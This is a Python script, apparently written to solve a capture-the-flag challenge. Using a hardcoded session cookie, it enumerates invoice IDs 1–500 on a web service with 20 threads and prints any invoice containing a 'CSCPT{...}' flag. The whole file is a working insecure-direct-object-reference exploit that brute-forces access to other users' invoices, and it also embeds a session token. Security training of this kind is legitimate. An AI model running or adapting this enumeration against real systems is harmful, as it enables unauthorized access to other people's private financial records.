import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

SESSION   = "eyJ1c2VyX2lkIjoyMTV9.ajVmnQ.7Ebgfzx3j-EeQCkbIFIqoclpY1s"
BASE_URL  = "http://193.136.164.147:24201/invoices"
MAX_ID    = 500
THREADS   = 20

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Cookie": f"session={SESSION}",
}

def check_invoice(invoice_id):
    try:
        r = requests.get(
            f"{BASE_URL}/{invoice_id}",
            headers=HEADERS,
            allow_redirects=False,
            timeout=5,
        )
        # 302 = not found / no access, skip
        if r.status_code != 200:
            return None
        if "CSCPT{" in r.text:
            flag = re.search(r"CSCPT\{[^}]+\}", r.text)
            return (invoice_id, flag.group(0) if flag else "FLAG found but couldn't parse", r.text)
    except requests.RequestException:
        pass
    return None


def main():
    print(f"[*] Scanning invoices 1–{MAX_ID} with {THREADS} threads...\n")

    found = False
    checked = 0

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(check_invoice, i): i for i in range(1, MAX_ID + 1)}

        for future in as_completed(futures):
            checked += 1
            result = future.result()

            if checked % 50 == 0:
                print(f"  ... checked {checked}/{MAX_ID}")

            if result:
                invoice_id, flag, body = result
                print(f"\n🚩 FLAG FOUND in invoice #{invoice_id}")
                print(f"   {flag}\n")

                # Strip tags and print readable invoice content
                clean = re.sub(r"<[^>]+>", " ", body)
                clean = re.sub(r"\s+", " ", clean).strip()
                print("[+] Invoice content (stripped):")
                print(clean[:800])

                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found:
        print(f"\n[!] No flag found in invoices 1–{MAX_ID}. Try increasing MAX_ID.")


if __name__ == "__main__":
    main()
    